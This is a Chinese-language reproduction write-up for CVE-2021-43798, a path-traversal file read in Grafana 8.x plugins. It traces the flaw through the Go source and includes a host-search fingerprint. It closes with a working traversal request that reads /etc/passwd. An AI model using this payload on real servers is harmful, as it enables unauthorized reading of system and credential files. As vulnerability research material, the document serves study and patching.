# Grafana plugins 任意文件读取漏洞 CVE-2021-43798

## 漏洞描述

Grafana存在任意文件读取漏洞，通过默认存在的插件，可构造特殊的请求包读取服务器任意文件

## 漏洞影响

<a-checkbox checked>Grafana 8.x</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="Grafana_Labs-公司产品"</a-checkbox></br>

## 漏洞复现

登录页面

![img](/assets/PeiQi-Wiki/img/1638885570573-25d2b257-36c8-43a7-bf8f-f552193f6649.png)

下载源码进行本地分析

```php
https://codeload.github.com/grafana/grafana/zip/refs/tags/v8.3.0
```

根据漏洞找到 api.go 中的请求路径

![img](/assets/PeiQi-Wiki/img/1638885654432-3d019c1a-81fd-429d-9667-6c1e829b694e.png)

```php
r.Get("/public/plugins/:pluginId/*", hs.getPluginAssets)
```

跟踪对应的 getPluginAssets 方法

![img](/assets/PeiQi-Wiki/img/1638885718491-08933f1d-ee0f-4eaa-b5d7-859c4889d2b7.png)

从请求路径中获取 `/public/plugins/` 后的参数赋值给 `pluginID,` 然后再被拼接至 `pluginFilePath` 进入文件读取片段

```go
requestedFile := filepath.Clean(web.Params(c.Req)["*"])
pluginFilePath := filepath.Join(plugin.PluginDir, requestedFile)
```

![img](/assets/PeiQi-Wiki/img/1638886241407-a47b7e8e-47fb-4481-8719-c532b51a5fa0.png)

也就是说通过默认存在的插件来拼接文件路径构造请求进行文件读取

```go
plugin, exists := hs.pluginStore.Plugin(c.Req.Context(), pluginID)
if !exists {
		c.JsonApiErr(404, "Plugin not found", nil)
		return
	}
```

插件路径 `public/app/plugins/panel`

![img](/assets/PeiQi-Wiki/img/1638886549610-16b0f045-996a-4e0d-86db-4b6c83a3a989.png)

构造请求

```go
/public/plugins/welcome/../../../../../../../../../etc/passwd
```

![img](/assets/PeiQi-Wiki/img/1638886726559-aa047e67-0bca-4b8c-bb07-4a9af6226e6e.png)